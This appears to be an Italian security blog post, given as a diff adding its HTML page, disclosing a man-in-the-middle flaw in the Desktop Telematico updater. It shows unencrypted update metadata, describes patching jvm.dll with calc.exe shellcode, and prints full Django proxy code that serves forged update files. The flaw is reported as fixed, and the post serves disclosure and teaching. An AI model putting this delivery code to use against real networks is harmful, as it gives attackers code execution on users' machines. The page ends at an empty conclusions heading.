@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>fibonhack | Desktop Telematico (Agenzia delle entrate), MITM to RCE</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-167636907-1');
+    </script>
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <img class="main-logo" src="/assets/images/fibonhack.png" alt="fibonhack">
+    </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu glow-yellow">
+      <ul>
+          <li><a href="/" >home</a></li>
+          <li><a href="/resources" >resources</a></li>
+          <li><a href="/posts" >posts</a></li>
+          <li><a href="/writeups" >writeups</a></li>
+        </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header" style="padding-bottom: 0.8em;">
+    <p> 25 Apr 2021 </p>
+    <h1 style="margin: -0.02em auto;"> Desktop Telematico (Agenzia delle entrate), MITM to RCE </h1>
+    <div id="authors"> by
+    
+    
+      
+      
+        <a href="/members/Maxpnl">Mattia Furlani</a>, 
+      
+      
+    
+      
+      
+        <a href="/members/NicolaVV">Nicola Vella</a>
+      
+      
+    
+    
+    </div>
+  </header>
+
+  <article class="post-content">
+  <p>Ciao a tutti, sono Mattia Furlani ed oggi vi parlerò di come sono riuscito a trovare un bug abbastanza grave all’interno del software Desktop Telematico, rilasciato dall’Agenzia delle entrate.</p>
+
+<h2 id="premesse">Premesse</h2>
+<p>Fino all’anno scorso, chiunque usasse, per motivi lavorativi o personali, il software Desktop Telematico, rischiava di scaricare codice malevolo (virus o quant’altro) ogni volta che aggiornava il programma.</p>
+
+<p>Questo perchè, nel caso nella stessa rete ci fosse stato un malintenzionato, quest’ultimo poteva modificare i file che venivano scaricati per l’aggiornamento tramite un attacco MiTM.</p>
+
+<p>Il problema poteva sembrare innocuo o con poco riscontro nella vita reale. Tuttavia, dato l’obbligo di utilizzo di questo software per commercialisti e CAF, e che spesso le reti usate sono pubbliche o comunque che la password del wifi viene condivisa con molte persone, la questione cambia.</p>
+
+<p>Pertanto, i dati detenuti da parte di queste figure professionali sono a rischio di essere rubati/manipolati/crittografati (basti pensare al danno che potrebbe fare un cryptolocker sul pc di un commercialista).</p>
+
+<p>Ho già contattato l’azienda che sviluppa il software ed hanno risolto in tempi molto rapidi, quindi kudos a loro.</p>
+
+<p>Per chi di voi svolge il ruolo di commercialista o utilizza il software Desktop Telematico, consiglio di assicurarsi che avete aggiornato il software dopo febbraio (circa), nel caso non l’aveste fatto invece riscaricate l’applicazione dal sito ufficiale.</p>
+
+<p>Per quelli di voi interessati al processo che mi ha portato a scoprire il problema e sviluppare l’exploit per sfruttarlo, di seguito i dettagli tecnici.</p>
+
+<h3 id="come-ho-scoperto-il-problema">Come ho scoperto il problema</h3>
+<p>Durante il processo di apertura della mia partita IVA (del mio cappio al collo) ho avuto la necessità di usare il software Desktop Telematico per preparare un documento da inviare all’agenzia delle entrate.</p>
+
+<p>All’apertura è iniziato un aggiornamento, mentre lo faceva mi è saltato all’occhio l’url da cui stava scaricando i file, <code class="language-plaintext highlighter-rouge">http://jws.agenziaentrate.it/...</code>.</p>
+
+<p>Wow, non mi sembra molto sicuro scaricare degli aggiornamenti in chiaro, anche perchè, qualsiasi persona nella nostra stessa rete potrebbe intercettare il traffico e cambiarne il contenuto. Sul momento, non avendo molto tempo nè voglia avevo lasciato stare, tuttavia causa covid a capodanno ero a casa da solo e mi è rivenuto in mente quello che avevo trovato.</p>
+
+<p>Vediamo se si può eseguire codice arbitrario… e come ho passato il capodanno :( …</p>
+
+<h2 id="analizzare-il-traffico-con-burp-suite">Analizzare il traffico con burp suite</h2>
+<p>Per fortuna BurpSuite permette di intercettare traffico HTTP che passa al di fuori del browser <a href="https://portswigger.net/support/using-burp-suites-invisible-proxy-settings-to-test-a-non-proxy-aware-thick-client-application">(link alla doc)</a>, questo mi ha permesso di visualizzare il traffico che passava.</p>
+
+<p>Purtroppo non ho fatto nessuno screenshot, tuttavia a partire da questo file XML (http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/compositeContent.xml) chiamava ricorsivamente i vari <em>child</em> per vedere se c’erano aggiornamenti, questi avevano a loro volta un <code class="language-plaintext highlighter-rouge">content.jar</code> , che in realtà erano zip con all’interno un <code class="language-plaintext highlighter-rouge">content.xml</code> , che contiene istruzioni su dipendenze e versioni dei pacchetti.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span>
+<span class="cp">&lt;?compositeMetadataRepository version='1.0.0'?&gt;</span>
+<span class="nt">&lt;repository</span> <span class="na">name=</span><span class="s">'&amp;quot;Sito applicazioni Entrate&amp;quot;'</span>
+    <span class="na">type=</span><span class="s">'org.eclipse.equinox.internal.p2.metadata.repository.CompositeMetadataRepository'</span> <span class="na">version=</span><span class="s">'1.0.0'</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;properties</span> <span class="na">size=</span><span class="s">'1'</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">'p2.timestamp'</span> <span class="na">value=</span><span class="s">'1315696288'</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/properties&gt;</span>
+  <span class="nt">&lt;children</span> <span class="na">size=</span><span class="s">'39'</span><span class="nt">&gt;</span>
+  	<span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-FileInternet'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Entratel'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Controlli'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Base'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Desktop'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Dichiarazioni'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Multiplatform'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Equitalia'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Anagrafico'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Atti-Registro'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Versamenti'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2014'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2015'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2016'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2017'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2018'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2019'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2020'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-2021'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dichiarazioni-Pregresse'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-EntiEsterni-Contribuenti'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-EntiEsterni-Operatori'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-EntiEsterni-Enti'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Denunce'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-IMU-TASI'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Collaborazione-Volontaria-2015'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Collaborazione-Volontaria-2017'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Collaborazione-Volontaria-2018'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-CessioniQuote'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Locazioni'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Rendicontazione'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dati-Estero'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-Dati-Estero-DAC6'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'AsiliNido'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Onlus'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'EntiEsterniCondivisa'</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Telematico-Comunicazioni'</span><span class="nt">/&gt;</span>
+	<span class="nt">&lt;child</span> <span class="na">location=</span><span class="s">'Controlli-EntiEsterni-ControlliGenerali-Condivisa'</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/children&gt;</span>
+<span class="nt">&lt;/repository&gt;</span>
+</code></pre></div></div>
+
+<p>Successivamente, se il software rileva che c’è un aggiornamento fa delle chiamate HTTP anche a degli  <code class="language-plaintext highlighter-rouge">artifacts.jar</code>, contenenti solo il file <code class="language-plaintext highlighter-rouge">artifacts.xml</code>, che contiene dati riguardanti agli aggiornamenti (dimensioni, hash, etc..).</p>
+
+<p>Per riassumere qui un esempio (striminzito) di come vengono fatte le chiamate</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/compositeContent.xml
+http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-FileInternet/content.jar
+http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Entratel/content.jar
+http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Controlli/content.jar
+..... (fa il fetch dei vari content.jar in base al contenuto di compositeContent.xml)
+</code></pre></div></div>
+<p>Se dai content.jar rileva una nuova versione a quel punto inizia a prendersi gli artifacts come sotto</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-FileInternet/artifacts.jar
+http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Entratel/artifacts.jar
+http://jws.agenziaentrate.it/telematicoEntrateUpdateSite/Telematico-Controlli/artifacts.jar
+...
+</code></pre></div></div>
+<p>Infine fa il fetch dei file a cui fanno riferimento gli artifacts, questo a meno che non li abbia già.</p>
+
+<p>Questo è il modo in cui gestisce gli aggiornamenti <a href="https://www.eclipse.org/equinox/p2/">p2 equinox</a>, personalmente non ho avuto voglia di studiare in modo approfondito come funziona, tuttavia, se vede che nel content.jar c’è una nuova versione di uno dei componenti principali, scarica ricorsivamente le sue dipendenze, sempre che non le abbia già ad una versione accettabile (buona parte del mio tempo l’ho perso per riuscire a far sentire al programma la presenza di un aggiornamento, è un sistema complesso e a parer mio sovraingegnerizzato).</p>
+
+<p>Una volta che sceglie i file di cui ha bisogno all’interno dei vari <code class="language-plaintext highlighter-rouge">contents.xml</code>, inizia a cercare il link di download a quei files da <code class="language-plaintext highlighter-rouge">artifacts.xml</code></p>
+
+<p>Analizzando il <code class="language-plaintext highlighter-rouge">content.xml</code> di <code class="language-plaintext highlighter-rouge">Telematico-Desktop</code>, ho notato questa parte</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;unit</span> <span class="na">id=</span><span class="s">'it.sogei.telematico.application.prodotto_root.win32.win32.x86'</span> <span class="na">version=</span><span class="s">'1.0.2.202012301051'</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;provides</span> <span class="na">size=</span><span class="s">'1'</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;provided</span> <span class="na">namespace=</span><span class="s">'org.eclipse.equinox.p2.iu'</span> <span class="na">name=</span><span class="s">'it.sogei.telematico.application.prodotto_root.win32.win32.x86'</span> <span class="na">version=</span><span class="s">'1.0.2.202012301051'</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;/provides&gt;</span>
+      <span class="nt">&lt;filter&gt;</span>
+        (<span class="ni">&amp;amp;</span>(osgi.arch=x86)(osgi.os=win32)(osgi.ws=win32))
+      <span class="nt">&lt;/filter&gt;</span>
+      <span class="nt">&lt;artifacts</span> <span class="na">size=</span><span class="s">'1'</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;artifact</span> <span class="na">classifier=</span><span class="s">'binary'</span> <span class="na">id=</span><span class="s">'it.sogei.telematico.application.prodotto_root.win32.win32.x86'</span> <span class="na">version=</span><span class="s">'1.0.2.202012301051'</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;/artifacts&gt;</span>
+      <span class="nt">&lt;touchpoint</span> <span class="na">id=</span><span class="s">'org.eclipse.equinox.p2.native'</span> <span class="na">version=</span><span class="s">'1.0.0'</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;touchpointData</span> <span class="na">size=</span><span class="s">'2'</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;instructions</span> <span class="na">size=</span><span class="s">'2'</span><span class="nt">&gt;</span>
+          <span class="nt">&lt;instruction</span> <span class="na">key=</span><span class="s">'uninstall'</span><span class="nt">&gt;</span>
+            cleanupzip(source:@artifact, target:${installFolder});
+          <span class="nt">&lt;/instruction&gt;</span>
+          <span class="nt">&lt;instruction</span> <span class="na">key=</span><span class="s">'install'</span><span class="nt">&gt;</span>
+            unzip(source:@artifact, target:${installFolder});
+          <span class="nt">&lt;/instruction&gt;</span>
+        <span class="nt">&lt;/instructions&gt;</span>
+      <span class="nt">&lt;/touchpointData&gt;</span>
+    <span class="nt">&lt;/unit&gt;</span>
+</code></pre></div></div>
+
+<p>Sembra che si possa far scaricare uno zip all’applicativo e farglielo estrarre nella sua cartella di root, questo serve per scaricare una nuova versione dell’eseguibile principale.</p>
+
+<p>Analizzando anche <code class="language-plaintext highlighter-rouge">artifacts.xml</code> si può notare che il file scaricato non viene neanche sottoposto ad un controllo dell’hash, tuttavia anche se lo fosse stato, sarebbe comunque stato possibile modificarlo, a causa dell’assenza di SSL.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;artifact</span> <span class="na">classifier=</span><span class="s">'binary'</span> <span class="na">id=</span><span class="s">'it.sogei.telematico.application.prodotto_root.win32.win32.x86'</span> <span class="na">version=</span><span class="s">'1.0.2.202012301051'</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;properties</span> <span class="na">size=</span><span class="s">'1'</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">'download.size'</span> <span class="na">value=</span><span class="s">'114293'</span><span class="nt">/&gt;</span>
+      <span class="nt">&lt;/properties&gt;</span>
+    <span class="nt">&lt;/artifact&gt;</span>
+</code></pre></div></div>
+
+<p>Come ho accennato prima,  <code class="language-plaintext highlighter-rouge">artifacts.xml</code> da anche informazioni su dove andarsi a prendere il file, di fatti questo file è raggiungibile all’url</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto\_root.win32.win32.x86\_1.0.2.202012301051
+</code></pre></div></div>
+<h2 id="patchare-la-jvm">Patchare la JVM</h2>
+<p>All’interno delle cartelle del programma c’è la cartella <code class="language-plaintext highlighter-rouge">jre</code>, contenente i file relativi al runtime di java, in particolare il file <code class="language-plaintext highlighter-rouge">\DesktopTelematico\jre\bin\client\jvm.dll</code> viene usato per far partire l’applicazione.</p>
+
+<p>Ho scelto di usare quel file per applicare la mia patch (contenente il codice che voglio far eseguire assieme all’aggiornamento), questo perchè il binario è abbastanza semplice e non dovrebbe avere alcun tipo di offuscamento strano.</p>
+
+<p>Come prima cosa (grazie al consiglio di Nicola Vella) ho creato un nuova sezione eseguibile usando <a href="https://ntcore.com/?page_id=388">CFF Explorer</a>, sotto si può vedere la differenza tra le sezioni prima e dopo le modifiche fatte grazie a questo tool</p>
+
+<p><img src="/assets/files/DesktopTelematico/Pasted image 20210422002433.png" alt="Before" />
+<img src="/assets/files/DesktopTelematico/Pasted image 20210422002553.png" alt="After" /></p>
+
+<p>Ho aggiunto quindi questa nuova sezione al binario chiamata <code class="language-plaintext highlighter-rouge">patch</code>, con una dimensione abbondantemente grande per inserire il mio codice.</p>
+
+<p>Successivamente ho cercato uno shellcode che eseguisse calc.exe, ho aggiunto il codice al binario col mio magico <code class="language-plaintext highlighter-rouge">radare2</code> e, grazie a <a href="https://x64dbg.com/#start">x64dbg</a> (che pare funzioni bene per debuggare file dll), sono riuscito a sistemare lo stack in modo che, dopo che saltavo sul mio codice, il programma riuscisse a procedere con la sua normale esecuzione senza problemi.</p>
+
+<p>Oltre a questo ho avuto la necessità di scrivere poche righe in assembly per evitare che <code class="language-plaintext highlighter-rouge">calc.exe</code> venisse fatto partire continuamente, questo per salvaguardare un po’ il mio povero PC, tuttavia non sto a mostrarlo visto che importa poco.</p>
+
+<h2 id="scrivere-il-server-per-il-mitm">Scrivere il server per il MITM</h2>
+
+<p>Arrivato a questo punto sapevo già che file andare a sovrascrivere e come farglielo scaricare, l’unico pezzo che mi mancava era scrivere un miniserver web che cambiasse solo i file necessari al mio PoC tra le tante risposte che inviava il server.</p>
+
+<p>I file da sostituire erano tre:</p>
+<ul>
+  <li>
+    <p>telematicoEntrateUpdateSite/Telematico-Desktop/artifacts.jar</p>
+  </li>
+  <li>
+    <p>telematicoEntrateUpdateSite/Telematico-Desktop/content.jar</p>
+  </li>
+  <li>
+    <p>telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto_root.win32.win32.x86_1.0.3.202012301051</p>
+  </li>
+</ul>
+
+<p>In questo caso dentro <code class="language-plaintext highlighter-rouge">artifacts.xml</code> e <code class="language-plaintext highlighter-rouge">content.xml</code> ho dovuto sostituire tutte le stringhe che facevano riferimento alla versione corrente di <code class="language-plaintext highlighter-rouge">it.sogei.telematico.application.prodotto_root.win32.win32.x86</code> con una nuova versione fittizzia, la <code class="language-plaintext highlighter-rouge">1.0.3.202012301051</code>.</p>
+
+<p>Oltre a questo, per fare in modo che al client importasse di questa nuova versione, ho dovuto cambiare la versione di <code class="language-plaintext highlighter-rouge">it.sogei.telematico.application.prodotto</code>, che sembra sia il <em>“main”</em> del file content.xml, in parole povere, il client, prima controlla se questo pacchetto ha un aggiornamento, e solo dopo controlla se ha tutti i pacchetti <code class="language-plaintext highlighter-rouge">required</code> ad una versione accettabile, nel caso gliene manchi qualcuno lo scarica.</p>
+
+<p>Quindi, siamo arrivati al punto cruciale, ora ci basta scrivere quel miniserver di cui parlavo.</p>
+
+<p>L’idea è che il dominio jws.agenziaentrate.it dovrà puntare a questo webserver, in modo che tutti i file vengano richiesti a quest’ultimo. Ogni volta che arriva una richiesta lui controlla se deve sostituirla con un file tra quelli elencati sopra, se lo deve fare ritorna il contenuto di quel file, altrimenti fa una richiesta all’ip del server ufficiale, ne prende la risposta, e la manda al nostro client, questo è il (terribile) codice della view</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s">"http://217.175.50.78/"</span>
+
+<span class="n">to_subst</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"telematicoEntrateUpdateSite/Telematico-Desktop/artifacts.jar"</span><span class="p">:</span> <span class="s">"./artifacts.zip"</span><span class="p">,</span>
+    <span class="s">"telematicoEntrateUpdateSite/Telematico-Desktop/content.jar"</span><span class="p">:</span> <span class="s">"./content.zip"</span><span class="p">,</span>
+    <span class="s">"telematicoEntrateUpdateSite/Telematico-Desktop/binary/it.sogei.telematico.application.prodotto_root.win32.win32.x86_1.0.3.202012301051"</span><span class="p">:</span> <span class="s">"./exploit.zip"</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">interceptAndModify</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+    <span class="n">right_fun</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"GET"</span><span class="p">:</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">,</span>
+        <span class="s">"HEAD"</span><span class="p">:</span> <span class="n">requests</span><span class="p">.</span><span class="n">head</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">if</span> <span class="n">path</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">to_subst</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
+        <span class="n">right_fun</span> <span class="o">=</span> <span class="n">right_fun</span><span class="p">[</span><span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="p">]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">right_fun</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ip</span><span class="si">}{</span><span class="n">path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">HttpResponse</span><span class="p">(</span>
+            <span class="n">status</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span>
+        <span class="p">)</span>
+        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s">"content"</span><span class="p">):</span>
+            <span class="n">resp</span><span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">right_fun</span> <span class="o">=</span> <span class="n">right_fun</span><span class="p">[</span><span class="s">"HEAD"</span><span class="p">]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">right_fun</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ip</span><span class="si">}{</span><span class="n">path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"content subs"</span><span class="p">)</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">HttpResponse</span><span class="p">(</span>
+            <span class="n">status</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span>
+        <span class="p">)</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"GET"</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">to_subst</span><span class="p">[</span><span class="n">path</span><span class="p">],</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">rd</span><span class="p">:</span>
+                <span class="n">resp</span><span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">rd</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">path</span> <span class="ow">in</span> <span class="n">to_subst</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">):</span>
+        <span class="n">orig_headers</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span>
+        <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="p">[</span><span class="s">"Content-Length"</span><span class="p">,</span> <span class="s">"Connection"</span><span class="p">,</span> <span class="s">"Keep-Alive"</span><span class="p">,</span> <span class="s">"Content-Type"</span><span class="p">]:</span>
+            <span class="k">if</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">orig_headers</span><span class="p">:</span>
+                <span class="k">del</span><span class="p">(</span><span class="n">orig_headers</span><span class="p">[</span><span class="n">y</span><span class="p">])</span>
+        <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">orig_headers</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
+            <span class="n">resp</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">k</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"skipping orig 404 headers"</span><span class="p">)</span>
+        <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">=</span> <span class="mi">200</span>
+        <span class="n">resp</span><span class="p">[</span><span class="s">"X-Powered-By"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Sogei S.p.A."</span>
+    <span class="k">if</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">to_subst</span><span class="p">.</span><span class="n">keys</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"last modified changed"</span><span class="p">)</span>
+        <span class="n">resp</span><span class="p">[</span><span class="s">"Last-Modified"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Wed, 20 Dec 2021 08:28:00 GMT"</span>
+
+
+    <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>
+        <span class="n">resp</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"application/java-archive"</span>
+    <span class="k">return</span> <span class="n">resp</span>
+
+
+</code></pre></div></div>
+
+<p>e questo quello che gestisce la route (sì lo so potevo usare flask al posto di django ma vabbè)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">django.urls</span> <span class="kn">import</span> <span class="n">re_path</span>
+<span class="kn">from</span> <span class="nn">.views</span> <span class="kn">import</span> <span class="n">interceptAndModify</span>
+<span class="n">urlpatterns</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">re_path</span><span class="p">(</span><span class="sa">r</span><span class="s">'^(?P&lt;path&gt;.*)$'</span><span class="p">,</span> <span class="n">interceptAndModify</span><span class="p">),</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<h2 id="demo-time">Demo time!</h2>
+<p>Finalmente posso dimostrare come, usando ettercap, da un pc connesso alla stessa rete della vittima, si possa fare un MiTM e, da questo, arrivare ad eseguire codice  remoto (in questo caso aprire calc.exe) quando la vittima apre il programma (e lascia che l’aggiornamento automatico venga completato)</p>
+
+<div style="width: 100%; height: 0px; position: relative; padding-bottom: 56.250%;"><iframe src="https://streamable.com/e/qrczq2" frameborder="0" width="100%" height="100%" allowfullscreen="" style="width: 100%; height: 100%; position: absolute;"></iframe></div>
+
+<h2 id="conclusioni">Conclusioni</h2>
+
